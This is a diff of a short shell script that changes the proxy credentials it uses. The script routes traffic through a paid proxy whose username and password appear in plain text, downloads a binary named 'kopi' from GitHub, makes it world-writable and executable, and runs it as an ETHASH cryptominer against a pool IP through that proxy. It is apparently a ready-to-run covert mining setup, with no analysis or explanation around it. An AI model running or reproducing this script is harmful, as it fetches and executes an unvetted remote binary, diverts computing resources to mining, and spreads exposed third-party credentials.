@@ -1,8 +1,8 @@
 
-curl --proxy "http://lagra:bSoa5anJnf@154.9.131.17:29569/" https://ipv4.webshare.io/
-export http_proxy=http://lagra:bSoa5anJnf@154.9.131.17:29569 &&
-export https_proxy=http://lagra:bSoa5anJnf@154.9.131.17:29569 &&
-export ftp_proxy=http://lagra:bSoa5anJnf@154.9.131.17:29569 &&
+curl --proxy "http://uelvoztx-rotate:u9o56czef06l@p.webshare.io:80/" https://ipv4.webshare.io/
+export http_proxy=http://uelvoztx-rotate:u9o56czef06l@p.webshare.io:80 &&
+export https_proxy=http://uelvoztx-rotate:u9o56czef06l@p.webshare.io:80 &&
+export ftp_proxy=http://uelvoztx-rotate:u9o56czef06l@p.webshare.io:80 &&
 wget https://github.com/selokguine3/yes/raw/main/kopi && chmod 777 kopi
-./kopi --algo ETHASH --pool 3.215.245.39:443 --user sagemod --proxy socks5 lagra:bSoa5anJnf@154.9.131.17:29569
+./kopi --algo ETHASH --pool 3.215.245.39:443 --user sagemode --proxy uelvoztx-rotate:u9o56czef06l@p.webshare.io:80
 
